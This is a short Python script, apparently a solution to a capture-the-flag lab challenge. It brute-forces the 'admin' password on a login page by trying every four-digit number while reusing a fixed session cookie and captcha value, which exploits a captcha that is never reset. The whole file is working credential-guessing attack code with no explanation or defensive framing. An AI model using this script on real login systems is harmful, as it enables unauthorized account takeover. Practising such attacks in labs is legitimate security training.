#-*- coding:utf-8 -*-
import requests
s=requests.Session()
url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
v='' 
headers ={ 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
            'Cookie':'PHPSESSID=81997a6ae1920b6e4f8f2950e5618074'
}
for p in range(1000,10000):
    payload = {
        'username':'admin',
        'pwd':p,
        'vcode':'8cfn',
    }
    r = s.post(url,headers=headers,data=payload)
    if 'error' not in r.text:
        print(str(p) + 'right')
        break
    else:
        print(str(p) + 'wrong')